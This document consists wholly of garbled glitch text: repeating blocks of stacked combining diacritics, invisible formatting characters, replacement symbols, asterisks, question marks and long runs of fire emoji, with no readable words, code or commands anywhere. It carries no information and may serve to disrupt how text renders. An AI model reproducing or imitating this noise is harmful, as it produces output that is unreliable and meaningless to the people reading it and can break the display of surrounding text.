̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴